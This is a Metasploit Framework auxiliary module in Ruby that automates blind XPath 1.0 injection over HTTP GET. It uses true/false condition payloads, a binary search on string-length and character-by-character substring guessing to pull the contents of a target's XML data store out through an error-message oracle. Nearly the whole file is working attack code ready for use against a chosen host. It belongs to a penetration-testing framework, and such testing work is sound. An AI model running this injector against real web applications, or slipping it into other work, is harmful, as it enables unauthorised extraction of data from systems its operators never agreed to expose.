##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanDir
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'   		=> 'HTTP Blind XPATH 1.0 Injector',
      'Description'	=> %q{
        This module exploits blind XPATH 1.0 injections over HTTP GET requests.
      },
      'Author' 		=> [ 'et [at] metasploit . com' ],
      'License'		=> BSD_LICENSE))

    register_options(
      [
        OptString.new('METHOD', [ true, "HTTP Method",'GET']),
        OptString.new('PATH', [ true,  "The URI Path", '/vulnerable.asp']),
        OptString.new('PRE_QUERY', [ true,  "Pre-injection HTTP URI Query", 'p1=v1&p2=v2&p3=v3']),
        OptString.new('POST_QUERY', [ false,  "Post-injection HTTP URI Query", ' ']),
        OptString.new('ERROR_MSG', [ true, "False error message", 'Server Error']),
        OptString.new('XCOMMAND', [ false, "XPath command to execute (Default for all XML doc)", '//*']),
        OptInt.new('MAX_LEN', [ true, "Maximum string length", 20000]),
        OptBool.new('MAX_OVER', [ true, "Dont detect result size. Use MAX_LEN instead", true ]),
        OptBool.new('CHKINJ', [ false, "Check XPath injection with error message", false ]),
        OptBool.new('DEBUG_INJ', [ false, "Debug XPath injection", true ])
      ], self.class)

  end

  def wmap_enabled
    false
  end

  def run_host(ip)

    #
    # Max string len
    #
    maxstr = datastore['MAX_LEN']

    conn = true

    rnum=rand(10000)

    # Weird crap only lower case 'and' operand works
    truecond = "'%20and%20'#{rnum}'='#{rnum}"
    falsecond = "'%20and%20'#{rnum}'='#{rnum+1}"

    hmeth = datastore['METHOD']
    tpath = normalize_uri(datastore['PATH'])
    prequery = datastore['PRE_QUERY']
    postquery = datastore['POST_QUERY']
    emesg = datastore['ERROR_MSG']
    xcomm = datastore['XCOMMAND']



    print_status("Initializing injection.")

    if datastore['CHKINJ']

      #
      # Detect error msg in true condition
      #

      begin
        res = send_request_cgi({
          'uri'  		=>  tpath,
          'query'     =>  "#{prequery}#{falsecond}#{postquery}",
          'method'   	=>	hmeth
        }, 20)

        return if not res

        if res.body.index(emesg)
          print_status("False statement check done.")
        else
          print_error("Error message not included in false condition.")
          return
        end
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        conn = false
      rescue ::Timeout::Error, ::Errno::EPIPE
      end

      #
      # Detect error msg in false condition
      #

      begin
        res = send_request_cgi({
          'uri'  		=>  tpath,
          'query'     =>  "#{prequery}#{truecond}#{postquery}",
          'method'   	=>	hmeth
        }, 20)

        return if not res

        if res.body.index(emesg)
          print_error("Error message included in true condition.")
          return
        else
          print_status("True statement check done.")
        end
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        conn = false
      rescue ::Timeout::Error, ::Errno::EPIPE
      end

      return if not conn
    end

    #
    # Find length of command result
    #

    low = 1
    high = maxstr

    if datastore['MAX_OVER']
      print_status("Max. limit set to #{maxstr} characters")
      reslen = maxstr
    else
      lenfound = false

      while !lenfound do
        middle = (low + high) / 2;

        if datastore['DEBUG_INJ']
          print_status("Length Low: #{low} High: #{high} Med: #{middle}")
        end

        injlen = "'%20and%20string-length(#{xcomm})=#{middle}%20and%20'#{rnum}'='#{rnum}"

        begin
          res = send_request_cgi({
            'uri'  		=>  tpath,
            'query'     =>  "#{prequery}#{injlen}#{postquery}",
            'method'   	=>	hmeth
          }, 20)

          return if not res

          if res.body.index(emesg)
            lenf = false
          else
            lenfound = true
            lenf = true
            lens = middle
          end
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
          conn = false
        rescue ::Timeout::Error, ::Errno::EPIPE
        end

        if !lenf
          injlen = "'%20and%20string-length(#{xcomm})<#{middle}%20and%20'#{rnum}'='#{rnum}"

          begin
            res = send_request_cgi({
              'uri'  		=>  tpath,
              'query'     =>  "#{prequery}#{injlen}#{postquery}",
              'method'   	=>	hmeth
            }, 20)

            return if not res

            if res.body.index(emesg)
              low = middle
            else
              high = middle
            end
          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            conn = false
          rescue ::Timeout::Error, ::Errno::EPIPE
          end
        end
      end

      print_status("Result size: #{lens}")
      reslen = lens.to_i
    end

    #
    # Execute xpath command and guess response
    #

    namestr = []
    numchr = 0

    for i in (1..reslen)
      #
      # Only alpha range
      #
      for k in (32..126)
        j = "%"+("%x" % k)

        # For Xpath 2.0 Blind search may be performed using a fast binary search using the
        # string-to-codepoints(string) function
        # injlen = "'%20and%20string-to-codepoints(substring(#{xcomm},#{i},1))<#{k}%20and%20'#{rnum}'='#{rnum}"

        # Basic Blind XPath 1.0 Injection
        injlen = "'%20and%20substring(#{xcomm},#{i},1)=\"#{j}\"%20and%20'#{rnum}'='#{rnum}"

        begin
          res = send_request_cgi({
            'uri'  		=>  tpath,
            'query'     =>  "#{prequery}#{injlen}#{postquery}",
            'method'   	=>	hmeth
          }, 20)

          return if not res

          if res.body.index(emesg)
            # neeeeext
          else
            if(numchr >= maxstr)
              # maximum limit reached
              print_status("#{xcomm}: #{namestr}")
              print_status("Maximum string length reached.")
              return
            end

            numchr+=1

            comperc = (numchr * 100) / maxstr

            namestr << "#{k.chr}"
            if datastore['DEBUG_INJ']
              print_status("#{comperc}%: '#{k.chr}' #{namestr}")
            end
            break
          end
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
          conn = false
        rescue ::Timeout::Error, ::Errno::EPIPE
        end
      end
    end

    print_status("#{xcomm}: #{namestr}")
    print_status("Done.")
  end
end
